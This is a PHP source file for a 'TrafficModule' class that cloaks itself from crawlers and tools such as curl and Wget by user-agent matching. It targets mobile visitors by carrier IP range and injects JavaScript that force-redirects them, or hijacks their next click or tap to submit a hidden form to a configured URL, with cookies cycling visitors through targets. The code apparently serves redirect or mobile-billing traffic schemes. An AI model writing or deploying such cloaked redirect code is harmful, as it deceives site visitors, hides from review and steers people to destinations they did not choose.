<?php

class TrafficModule
{
  private $ip;
  private $flow;
  private $detect;
  private $jsCookie = null;

  public static function Create()
  {
    return new static();
  }

  public function redirect()
  {
    if ($this->isSpider()) return '';

    $isMobile = $this->detect->isMobile();
    if ($this->flow['type'] == 'web') return $this->htmlForm();
    if ($this->flow['type'] == 'wap' && !$isMobile) return '';
    if ($this->flow['type'] == 'wap' && $isMobile) {
      $ip = $this->getIp();
      $operator = $this->checkIp($ip);
      if (!$operator && !$this->flow['has_extra']) return '';
      if ($this->flow['has_extra']) return $this->htmlForm();
      if ($this->checkCycles($operator)) return $this->htmlForm();
    }

    return '';
  }

  private function __construct()
  {
    $this->ip = require_once IP_FILE;
    $this->flow = require_once FLOW_FILE;
    $this->detect = new Mobile_Detect();
  }

  private function isSpider()
  {
    $list = array('Yandex', 'Google', 'Accoona', 'ia_archiver', 'Jeeves', 'curl', 'EltaIndexer',
      'baidu', 'crawler', 'W3C_Validator', 'Wget', 'WebAlta', 'Yahoo', 'Rambler', 'Ask', 'Turtle', 'Nigma', 'Robot', 'proximic', 'bot', 'mail', 'spider', 'Bond', 'YaBrowser');

    $ua = trim($_SERVER['HTTP_USER_AGENT']);
    if (!$ua) return true;

    $pattern = '/' . implode('|', $list) . '/i';
    if (preg_match($pattern, $ua, $match)) return true;

    if (stristr($ua, 'Mozilla/5.0 (Linux; U; Android 3.1; en-us; GT-P7510 Build/HMJ37) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13')) return true;
    if (stristr($ua, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5')) return true;

    return false;
  }

  private function htmlForm()
  {
    $type = isset($this->flow['redirect_type'])? $this->flow['redirect_type'] : 1;
    $url = $this->flow['url'];

    $js = '';
    if ($this->jsCookie) {
      $js = <<<JSC
        <script type="text/javascript">
          document.cookie = "$this->jsCookie";
        </script>
JSC;
    }

    switch ($type) {
      case 1 :
        $js .= <<<JS1
        <script type="text/javascript">
          window.location.replace("$url"); 
          window.location.href = "$url";
        </script>
JS1;
        break;
      case 2 :
        $js .= <<<JS2
<form action="$url" method="get" name="traffic-form"></form>
<script type="text/javascript">
if (typeof document.ontouchstart =="undefined") { 
  document.ontouchstart = function(){};
} 
document.onclick = document.ontouchstart = function(e){ 
  document.forms["traffic-form"].submit(); 
} 
</script>
JS2;
        break;
      case 3 :
        $js .= <<<JS3
<form action="$url" method="get" name="traffic-form" target="_blank"></form>
<script type="text/javascript">
  if(typeof document.ontouchstart == "undefined") { 
    document.ontouchstart = function(){};
  } 
  document.onclick = document.ontouchstart = function(e){ 
    document.forms["traffic-form"].submit(); 
    document.onclick = function(e){ return false; } 
  }  
</script> 
JS3;
        break;
      default :
        break;
    }

    return $js;
  }

  private function getIp()
  {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
      $ip = explode(',', $_SERVER['HTTP_CLIENT_IP']);
      return trim(array_shift($ip));
    }

    if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
      $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
      return trim(array_shift($ip));
    }

    if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
      $ip = explode(',', $_SERVER['HTTP_X_REAL_IP']);
      return trim(array_shift($ip));
    }

    if (array_key_exists('HTTP_FORWARDED', $_SERVER)) {
      $forwardedForArray = explode(',', $_SERVER['HTTP_FORWARDED']);
      $forwardedFor = $forwardedForArray[0];
      $forwardedForArray = explode(';', $forwardedFor);
      $forwardedFor = $forwardedForArray[0];

      if (0 <= strpos($_SERVER['HTTP_FORWARDED'], 'for')) {
        $forwardedForArray = explode('=', $forwardedFor);
        if (count($forwardedForArray)) {
          return trim($forwardedForArray[1]);
        }
      }
    }

    return $_SERVER['REMOTE_ADDR'];
  }

  private function checkIp($ip)
  {
    $op = null;
    foreach (array_keys($this->ip) as $operator) {
      foreach ($this->ip[$operator] as $range) {
        if ($this->isIpMatch($ip, $range)) {
          $op = $operator;
          break 2;
        }
      }
    }

    return $op;
  }

  private function isIpMatch($ip, $range)
  {
    if (strpos($range, '/') === FALSE) {
      return $range == $ip;
    }

    list($range, $netMask) = explode('/', $range, 2);
    $rangeDecimal = ip2long($range);
    $ipDecimal = ip2long($ip);
    $netMaskDecimal = ~(pow(2, (32 - $netMask)) - 1);
    return (($ipDecimal & $netMaskDecimal) == ($rangeDecimal & $netMaskDecimal));
  }

  private function checkCycles($operator)
  {
    if (!isset($this->flow['cycles'][$operator]) || empty($this->flow['cycles'][$operator]))
      return false;

    $cycles = $this->flow['cycles'][$operator];
    $visited = isset($_COOKIE[COOKIE_NAME]) ? explode(':', $_COOKIE[COOKIE_NAME]) : array();

    foreach ($cycles as $id) {
      if (!in_array($id, $visited)) {
        $visited[] = $id;
        $this->jsCookie = COOKIE_NAME . '=' . implode(":", $visited) . '; path=/; expires=' . date('r', time() + 60 * 60 * 24);
        return true;
      }
    }

    return false;
  }
}
